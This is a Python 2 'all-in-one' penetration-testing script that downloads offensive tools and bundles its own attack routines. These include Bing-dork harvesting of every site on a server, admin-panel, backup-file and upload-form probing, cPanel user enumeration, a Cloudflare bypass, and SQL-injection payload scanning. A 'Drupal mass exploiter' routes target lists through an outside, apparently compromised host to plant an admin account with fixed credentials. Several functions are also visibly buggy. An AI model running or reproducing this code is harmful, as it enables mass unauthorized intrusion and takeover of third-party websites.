#!/usr/bin/env python2.7
#
#          All In One Tool For Penetration Testing 
#           Authors : Fedy Wesleti , Mohamed Nour 
#
import sys
import os
import httplib
import subprocess
import re, urllib2
import socket
import urllib,sys,json
from commands import *
from platform import system
from urlparse import urlparse
########################## 
#Variables
yes = set(['yes','y', 'ye', 'Y'])
no = set(['no','n'])
def logo():
    print """
  ########  ######## ##    ## ########   #######  ##     ## 
  ##     ## ##       ###   ## ##     ## ##     ##  ##   ##  
  ##     ## ##       ####  ## ##     ## ##     ##   ## ##   
  ########  ######   ## ## ## ########  ##     ##    ###    
  ##        ##       ##  #### ##     ## ##     ##   ## ##   
  ##        ##       ##   ### ##     ## ##     ##  ##   ##  
  ##        ######## ##    ## ########   #######  ##     ##  v1.0  
                                  Pentesting Tools Auto-Downloader 
 
  [+]       Coded BY Mohamed Nour & Fedy Weslety        [+] 
  [+]          FB/CEH.TN    ~~   FB/mohamed.zeus.0      [+] 
  [+]             Greetz To All Pentesters              [+] 
"""
##########################
#this is the big menu funtion 
def menu():
    print ("""
  ########  ######## ##    ## ########   #######  ##     ## 
  ##     ## ##       ###   ## ##     ## ##     ##  ##   ##  
  ##     ## ##       ####  ## ##     ## ##     ##   ## ##   
  ########  ######   ## ## ## ########  ##     ##    ###    
  ##        ##       ##  #### ##     ## ##     ##   ## ##   
  ##        ##       ##   ### ##     ## ##     ##  ##   ##  
  ##        ######## ##    ## ########   #######  ##     ##  v1.0  
                                  Pentesting Tools Auto-Downloader 
 
  [+]       Coded BY Mohamed Nour & Fedy Weslety        [+] 
  [+]          FB/CEH.TN    ~~   FB/mohamed.zeus.0      [+] 
  [+]             Greetz To All Pentesters              [+] 

    Select from the menu:

    1 : Information Gathering
    2 : Password Attacks
    3 : Wireless Testing
    4 : Exploitation Tools
    5 : Sniffing & Spoofing
    6 : Privat Tools
    7 : Drupal Hacking
    99 : Exit

    """)
    choice = raw_input("Enter Your Choice:")
    
    if choice == "1":
        info()
    elif choice == "2":
        passwd()
    elif choice == "3":
        wire()
    elif choice == "4":
        exp()
    elif choice == "5":
        snif()
    elif choice == "6":
        tnn()
    elif choice == "7":
        maine()
    elif choice == "99":
        os.system('clear'),sys.exit();
    elif choice == "":
        menu()
    else: 
        menu()
##########################
#Host 2 ip
def h2ip():
    host = raw_input("Select A Host : ")
    ips = socket.gethostbyname(host)
    print(ips)
##########################
#ports
def ports():
    os.system("clear")
    target = raw_input('Select a Target IP :')
    os.system("nmap -O -Pn %s" % target) 
    sys.exit();
##########################
#inurlbr
def ifinurl():
    print""" This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found."""
    print('do you have Inurlbr installed ? ')
    cinurl = raw_input("Y / N : ")
    if cinurl in yes:
        inurl()
    if cinurl in no:
        insinurl()
    elif cinurl == "":
        menu()
    else: 
        menu()
####################################
def inurl():
    dork = raw_input("select a Dork:")
    output = raw_input("select a file to save :")
    os.system("./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
    if cinurl in no:
        insinurl()
    elif cinurl == "":
        menu()
    else: 
        menu()
####################################
def insinurl():
    os.system("git clone https://github.com/googleinurl/SCANNER-INURLBR.git")
    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
    os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
    os.system("clear")
    inurl()
####################################
#nmap function 
def nmap():

    choice7 = raw_input("continue ? Y / N : ")
    if choice7 in yes :
        os.system("wget https://nmap.org/dist/nmap-7.01.tar.bz2")
        os.system("bzip2 -cd nmap-7.01.tar.bz2 | tar xvf -")
        os.system("cd nmap-7.01 & ./configure")
        os.system("cd nmap-7.01 & make")
        os.system("su root")
        os.system("cd nmap-7.01 & make install")
    elif choice7 in no :
        info()
    elif choice7 == "":
        menu()
    else: 
        menu()
####################################
#jboss-autopwn
def jboss():
    os.system('clear')
    print ("This JBoss script deploys a JSP shell on the target JBoss AS server. Once")
    print ("deployed, the script uses its upload and command execution capability to")
    print ("provide an interactive session.")
    print ("")
    print ("usage : ./e.sh target_ip tcp_port ")
    print("Continue: y/n")
    choice9 = raw_input("yes / no :")
    if choice9 in yes:
        os.system("git clone https://github.com/SpiderLabs/jboss-autopwn.git"),sys.exit();
    elif choice9 in no:
        os.system('clear'); exp()
    elif choice9 == "":
        menu()
    else: 
        menu()
####################################
#sqlmap 
def sqlmap():
    print ("usage : python sqlmap.py -h")
    choice8 = raw_input("Continue: y/n :")
    if choice8 in yes:
        os.system("git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
    elif choice8 in no:
        os.system('clear'); info()
    elif choice8 == "":
        menu()
    else: 
        menu()
####################################
#setoolkit 
def setoolkit():
    print ("The Social-Engineer Toolkit is an open-source penetration testing framework")
    print(") designed for social engineering. SET has a number of custom attack vectors that ")
    print(" allow you to make a believable attack quickly. SET is a product of TrustedSec, LLC  ")
    print("an information security consulting firm located in Cleveland, Ohio.")
    print("")
    choiceset = raw_input("y / n :")
    if choiceset in yes:
        os.system("git clone https://github.com/trustedsec/social-engineer-toolkit.git")
        os.system("python social-engineer-toolkit/setup.py")
    if choiceset in no:
        os.system("clear"); info()
    elif choiceset == "":
        menu()
    else: 
        menu()
####################################
#cupp 
def cupp():
    print("cupp is a password list generator ")
    print("Usage: python cupp.py -h")
    choicecupp = raw_input("Continue: y/n : ")
    
    if choicecupp in yes:
        os.system("git clone https://github.com/Mebus/cupp.git")
        print("file downloaded successfully")
    elif choicecupp in no:
        os.system("clear"); passwd()
    elif choicecupp == "":
        menu()
    else: 
        menu()
####################################
#ncrack 
def ncrack():
    print("A Ruby interface to Ncrack, Network authentication cracking tool.")
    print("requires : nmap >= 0.3ALPHA / rprogram ~> 0.3")
    print("Continue: y/n")
    choicencrack = raw_input("y / n :")
    if choicencrack in yes:
        os.system("git clone https://github.com/sophsec/ruby-ncrack.git")
        os.system("cd ruby-ncrack")
        os.system("install ruby-ncrack")
    elif choicencrack in no:
        os.system("clear"); passwd()
    elif choicencrack == "":
        menu()
    else: 
        menu()
####################################
#reaver
def reaver():
    print """
      Reaver has been designed to be a robust and practical attack against Wi-Fi Protected Setup
      WPS registrar PINs in order to recover WPA/WPA2 passphrases. It has been tested against a
      wide variety of access points and WPS implementations
      1 to accept / 0 to decline
        """
    creaver = raw_input("y / n :")
    if creaver in yes:
        os.system("apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("git clone https://github.com/t6x/reaver-wps-fork-t6x.git")
        os.system("cd reaver-wps-fork-t6x/src/ & ./configure")
        os.system("cd reaver-wps-fork-t6x/src/ & make")
    elif creaver in no:
        os.system("clear"); wire()
    elif creaver == "":
        menu()
    else: 
        menu()
####################################
#sslstrip
def ssls():
    print"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping 
    attacks.
    It requires Python 2.5 or newer, along with the 'twisted' python module."""
    cssl = raw_input("y / n :")
    if cssl in yes: 
        os.system("git clone https://github.com/moxie0/sslstrip.git")
        os.system("sudo apt-get install python-twisted-web")
        os.system("python sslstrip/setup.py")
    if cssl in no:
        snif()
    elif cssl =="":
        menu()
    else:
        menu()
####################################
#shellnoob
def shellnoob():
    print """Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!"""
    cshell = raw_input("Y / N : ")
    if cshell in yes:
        os.system("git clone https://github.com/reyammer/shellnoob.git")
        os.system("mv shellnoob/shellnoob.py shellnoob.py")
        os.system("sudo python shellnoob.py --install")
    if cshell in no:
        exp()
    elif cshell =="":
        menu()
    else:
        menu()
#####################################
#information gathering function
def info():
    print("1: nmap ")
    print("2: Setoolkit")
    print("3: Port Scanning")
    print("4: Host To IP")
    print("99: Back To Main Menu")
    choice2 = raw_input("Select from the menu:")
    if choice2 == "1":
        os.system('clear'); nmap()
    if choice2 == "2":
        os.system("clear"); setoolkit()
    if choice2 == "3":
        os.system("clear"); ports()
    if choice2 == "4":
        os.system("clear"); h2ip()
    elif choice2 =="99":
        os.system("clear"); menu()
    elif choice2 == "":
        menu()
    else: 
        menu()
##########################
def priv8():
    tnn()
#password attacks menu 
def passwd():
    print("1:  cupp ")
    print("2:  Ncrack")
    print("99: Back To Main Menu")
    choice3 = raw_input("Select from the menu:")
    if choice3 =="1":
     os.system("clear"); cupp()
    elif choice3 =="2":
        os.system("clear"); ncrack()
    elif choice3 =="99":
        os.system("clear"); menu()
    elif choice3 == "":
        menu()
    else: 
        menu()
##########################
#wireless attacks
def wire():
    print("1:  reaver ")
    print("99: Back To The Main Menu")
    choice4 = raw_input("Select from the menu:")
    if choice4 =="1":
     os.system("clear");reaver()
    elif choice4 =="99":
        menu()
    elif choice4 == "":
        menu()
    else: 
        menu()
##########################
#exploitation tools
def exp():
    print("1 : jboss-autopwn ")
    print("2 : sqlmap")
    print("3 : Shellnoob")
    print("4 : Inurlbr")
    print("99 : Go Back To Main Menu")
    choice5 = raw_input("Select from the menu:")
    if choice5 =="2":
        os.system("clear"); sqlmap()
    if choice5 =="1":
     os.system('clear'); jboss()
    if choice5 =="3":
        os.system("clear"); shellnoob()
    if choice5 == "4":
        os.system("clear"); ifinurl()
    elif choice5 =="99":
        menu()
    elif choice5 == "":
        menu()
    else: 
        menu()
###########################
#sniffing tools
def snif():
    print("1 : Setoolkit ")
    print("2 : Ssltrip")
    print("99: Back To Main Menu")
    choice6 = raw_input("Select from the menu:")
    if choice6 =="1":
     os.system("clear"); setoolkit()
    if choice6 =="2":
        os.system("clear"); ssls()
    if choice6 =="99":
       os.system("clear"); menu()
    elif choice6 == "":
        menu()
    else: 
        menu()
##########################
#if Os is Windows 
def win():
    os.system("clear")
    print("Our Tool Does Not Support Windows , run it on linux or install a virtual machine ")
    sys.exit();
  #Check use OS
##########################
def OS():
    print(
    """
    Choose Operating System : 
    1) Mac OSX
    2) Linux
    3) Windows
    """)
    system = raw_input("choose an OS : ")
    if system =="2":
        menu()
    elif system =="1":
        root()
    elif system =="3":
        win()
    elif system == "":
        OS()
    else:
        sys.exit();
############################
#check root if linux 
def root():
    if os.getuid() != 0:
        print("Are you root? Please execute as root")
        exit() 
    else:
        menu()
#############################
#priv8 menu 
menuu = """
 1) Get all websites
 2) Get joomla websites
 3) Get wordpress websites
 4) Find control panel
 5) Find zip files
 6) Find upload files
 7) Get server users
 8) Scan from SQL injection
 9) Crawl and scan from SQL injection
 10) Scan ports (range of ports)
 11) Scan ports (common ports)
 12) Get server banner
 13) Bypass Cloudflare
 99) Exit
"""
#############################
#grab function 
def unique(seq):
    """
    get unique from list found it on stackoverflow
    """
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]
############################
#clear screen function 
def clearScr() :
    """
    clear the screen in case of GNU/Linux or 
    windows 
    """
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')
############################
class TNscan : #TNscan Function menu 
    def __init__(self, serverip) :
        self.serverip = serverip
        self.getSites(False)
        print menuu
        while True :
            choice = raw_input(' Enter choice -> ')
            if choice == '1' :
                self.getSites(True)
            elif choice == '2' :
                self.getJoomla()
            elif choice == '3' :
                self.getWordpress()
            elif choice == '4' :
                self.findPanels()
            elif choice == '5' :
                self.findZip()
            elif choice == '6' :
                self.findUp()
            elif choice == '7' :
                self.getUsers()
            elif choice == '8' :
                self.grabSqli()
            elif choice == '9' :
                nbpages = int(raw_input(' Enter number of pages to crawl (ex : 100) -> '))
                self.crawlSqli(nbpages)
            elif choice == '10' :
                ran = raw_input(' Enter range of ports, (ex : 1-1000) -> ')
                self.portScanner(1, ran)
            elif choice == '11' :
                self.portScanner(2, None)
            elif choice == '12' :
                self.getServerBanner()
            elif choice == '13' :
                self.cloudflareBypasser()
            elif choice == '99' :
                print ' Goodbye'
                exit()
            con = raw_input(' Continue [Y/n] -> ')
            if con[0].upper() == 'N' :
                exit()
            else :
                clearScr()
                print menuu
############################       
#get websites from server
    def getSites(self, a) :
        """
        get all websites on same server
        from bing search
        """
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    allnoclean = findwebs[i]
                    findall1 = re.findall('http://(.*?)/', allnoclean)
                    for idx, item in enumerate(findall1):
                        if 'www' not in item:
                            findall1[idx] = 'http://www.' + item + '/'
                        else:
                            findall1[idx] = 'http://' + item + '/'
                    lista.extend(findall1)
                    
                page += 50
            except urllib2.URLError:
                pass
        self.sites = unique(lista)
        if a :      
            clearScr()
            print '[*] Found ', len(lista), ' Website\n'
            for site in self.sites :
                print site 
############################
#get wordpress websites 
    def getWordpress(self) :
        """
        get wordpress site using a dork the attacker
        may do a password list attack (i did a tool for that purpose check my pastebin) 
        or scan for common vulnerabilities using wpscan for example (i did a simple tool 
        for multi scanning using wpscan)
        """
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+?page_id=&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    wpnoclean = findwebs[i]
                    findwp = re.findall('(.*?)\?page_id=', wpnoclean)
                    lista.extend(findwp)
                page += 50
            except:
                pass
        lista = unique(lista)
        clearScr()
        print '[*] Found ', len(lista), ' Wordpress Website\n'
        for site in lista :
            print site
############################
#get joomla websites
    def getJoomla(self) :
        """
        get all joomla websites using 
        bing search the attacker may bruteforce
        or scan them 
        """
        lista = []
        page = 1
        while page <= 101:
            bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+index.php?option=com&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                jmnoclean = findwebs[i]
                findjm = re.findall('(.*?)index.php', jmnoclean)
                lista.extend(findjm)
            page += 50
        lista = unique(lista)
        clearScr()
        print '[*] Found ', len(lista), ' Joomla Website\n'
        for site in lista :
            print site
############################
#find admin panels
    def findPanels(self) :
        """
        find panels from grabbed websites
        the attacker may do a lot of vulnerabilty 
        tests on the admin area
        """
        print "[~] Finding admin panels"
        adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/', 'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
        clearScr()
        for site in self.sites :
            for admin in adminList :
                try :
                    if urllib.urlopen(site + admin).getcode() == 200 :
                        print " [*] Found admin panel -> ", site + admin
                except IOError :
                    pass
 ############################         
 #find ZIP files          
    def findZip(self) :
        """
        find zip files from grabbed websites
        it may contain useful informations
        """
        zipList = ['backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip', 'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar', 'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar']
        clearScr()
        print "[~] Finding zip file"
        for site in self.sites :
            for zip1 in zipList :
                try:
                    if urllib.urlopen(site + zip1).getcode() == 200 :
                        print " [*] Found zip file -> ", site + zip1
                except IOError :
                    pass
 ############################  
 #find upload directories     
    def findUp(self) :
        """
        find upload forms from grabbed 
        websites the attacker may succeed to 
        upload malicious files like webshells
        """
        upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php','blog/up.php', 'upload.php', 'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
        clearScr()
        print "[~] Finding Upload"
        for site in self.sites :
            for up in upList :
                try :   
                    if (urllib.urlopen(site + up).getcode() == 200) :
                        html = urllib.urlopen(site + up).readlines()
                        for line in html :
                            if re.findall('type=file', line) :
                                print " [*] Found upload -> ", site+up
                except IOError :
                    pass
 ############################ 
#find users                  
    def getUsers(self) :
        """
        get server users using a method found by 
        iranian hackers i think, the attacker may
        do a bruteforce attack on CPanel, ssh, ftp or 
        even mysql if it supports remote login
        (you can use medusa or hydra)
        """
        clearScr()
        print "[~] Grabbing Users"
        userslist = []
        for site1 in self.sites :
            try:
                site = site1
                site = site.replace('http://www.', '')
                site = site.replace('http://', '')
                site = site.replace('.', '')
                if '-' in site:
                    site = site.replace('-', '')
                site = site.replace('/', '')
                while len(site) > 2:
                    resp = urllib2.urlopen(site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
                    if 'invalid username' not in resp.lower():
                        print '\t [*] Found -> ', site
                        userslist.append(site)
                        break
                    else :
                        print site
                        
                    site = site[:-1]
            except:
                pass
                    
        clearScr()
        for user in userslist :
            print user
############################        
#bypass cloudflare   
    def cloudflareBypasser(self) :
        """
        trys to bypass cloudflare i already wrote
        in my blog how it works, i learned this 
        method from a guy in madleets
        """
        clearScr()
        print "[~] Bypassing cloudflare"
        subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
        for site in self.sites :
            site.replace('http://', '')
            site.replace('/', '')           
            try:
                ip = socket.gethostbyname(site)
            except socket.error:
                pass
            for sub in subdoms:
                doo = sub + '.' + site
                print ' [~] Trying -> ', doo
                try:
                    ddd = socket.gethostbyname(doo)
                    if ddd != ip:
                        print ' [*] Cloudflare bypassed -> ', ddd
                        break
                except socket.error :
                    pass
############################   
#find the server banner                 
    def getServerBanner(self) :
        """
        simply gets the server banner 
        the attacker may benefit from it 
        like getting the server side software
        """
        clearScr()
        try:
            s = 'http://' + self.serverip
            httpresponse = urllib.urlopen(s)
            print ' [*] Server header -> ', httpresponse.headers.getheader('server')
        except:
            pass
############################    
#greb the sqli         
    def grabSqli(self) :
        """
        just grabs all websites in server with php?id= dork 
        for scanning for error based sql injection
        """
        page = 1
        lista = []
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+php?id=&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    x = findwebs[i]
                    lista.append(x)
            except:
                pass            
            page += 50  
        lista = unique(lista)       
        self.checkSqli(lista)
 ############################      
 #scan for sql injection  
    def checkSqli(self, s):
        """
        checks for error based sql injection,
        most of the codes here are from webpwn3r 
        project the one who has found an lfi in 
        yahoo as i remember, you can find a separate 
        tool in my blog 
        """
        clearScr()
        print "[~] Checking SQL injection"
        payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
        check = re.compile("Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
        for url in s:
            try:
                for param in url.split('?')[1].split('&'):
                    for payload in payloads:
                        power = url.replace(param, param + payload.strip())
                        #print power
                        html = urllib2.urlopen(power).readlines()
                        for line in html:
                            checker = re.findall(check, line)
                            if len(checker) != 0 :
                                print ' [*] SQLi found -> ', power
            except:
                pass
 ############################   
 #craw SQL 
    def crawlSqli(self, nbpages) :
        """
        simple crawling using chilkat (yeah chilkat sucks)
        and scan for error based sql injection
        [!] will be on the next version
        """
        import chilkat
        spider = chilkat.CkSpider()
        for url in self.sites :
            spidred = []
            print " [~] Crawling -> ", url
            spider.Initialize(url)
            #spider.unspideredUrl(url)
            i = 0
            for i in range(nbpages) :
                if spider.CrawlNext() :
                    spidred.append(spider.lastUrl())
            print " [+] Crawled -> ", spidred
            print " [~] Scanning -> ", url, " from SQL injection"
            self.checkSqli(spidred)
  ############################        
  #scan for ports  
    def portScanner(self, mode, ran) :
        """
        simple port scanner works with range of ports 
        or with common ports (al-swisre idea)
        """
        clearScr()
        print "[~] Scanning Ports"
        def do_it(ip, port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #sock.settimeout(5)
            sock = sock.connect_ex((ip,port))
            if sock == 0:
                print " [*] Port %i is open" % port 
        
        if mode == 1 :
            a = ran.split('-')
            start = int(a[0])
            end = int(a[1])
            for i in range(start, end):
                do_it(self.serverip, i)
        elif mode == 2 :
            for port in [80,21,22,2082,25,53,110,443,143] :
                # didn't use multithreading cos it's few ports
                do_it(self.serverip, port)
############################


minu ='''
\t 1: Drupal Bing Exploiter
\t 2: Get Drupal Websites
\t 3: Drupal Mass Exploiter
\t 99: Back To Main Menu
'''


            #Definition Of Drupal Bing Expoliter 
def drupal():

    '''Drupal Exploit Binger All Websites Of server '''
    ip  = raw_input('1- IP : ')
    page  = 1
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"&go=Valider&qs=n&form=QBRE&pq=ip%3A"+ip+"&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      
      for url in findurl :
        try : 
            
                        urlpa = urlparse(url)
                        site  = urlpa.netloc

                        print "[+] Testing At "+site
                        resp = urllib2.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url='+site+'&submit=submit')
                        read=resp.read()
                        if "User : HolaKo" in read:
                           print "Exploit found =>"+site

                           print "user:HolaKo\npass:admin"
                           a = open('up.txt','a')
                           a.write(site+'\n')
                           a.write("user:"+user+"\npass:"+pwd+"\n")
                        else :
                           print "[-] Expl Not Found :( "

        except Exception as ex :
                       print ex
                       sys.exit(0)


            #Drupal Server ExtraCtor
def getdrupal():
    ip  = raw_input('2- Ip : ')
    page  = 1
    sites = list()
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"+node&go=Valider&qs=ds&form=QBRE&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      
      for url in findurl :
                             split = urlparse(url)
                             site   = split.netloc
                             if site not in sites :
                                      print site 
                                      sites.append(site)
      

            #Drupal Mass List Exploiter 
def drupallist():
    listop = raw_input("Enter The list Txt :")
    fileopen = open(listop,'r')
    content = fileopen.readlines() 
    for i in content :
        url=i.strip()
        try :
            openurl = urllib2.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url='+url+'&submit=submit')
            readcontent = openurl.read()
            if  "Success" in readcontent :
                print "[+]Success =>"+url
                print "[-]username:HolaKo\n[-]password:admin"
                save = open('drupal.txt','a')
                save.write(url+"\n"+"[-]username:HolaKo\n[-]password:admin\n")
                               
            else : 
                print i + "=> exploit not found " 
        except Exception as ex :
            print ex

def maine():
    
     print minu
     choose = raw_input("choose a number :")
     while True : 
      
      if choose == "1": 
        drupal()
      if choose == "2":
        getdrupal()
      if choose == "3":
        drupallist()
      if choose == "4":
        about()
      if choose == "99":
           
            menu()
      con = raw_input('Continue [Y/n] -> ')
      if con[0].upper() == 'N' :
                                    exit()
      if con[0].upper() == 'Y' :
                                    maine()
                                

#initialise the tnscan function 
class tnn():
    def __init__(self):
        clearScr()
        aaa = raw_input("Target IP : ")
        TNscan(aaa)
############################
#begin :D 
if __name__ == "__main__":
  OS()
    
    
    
    
  
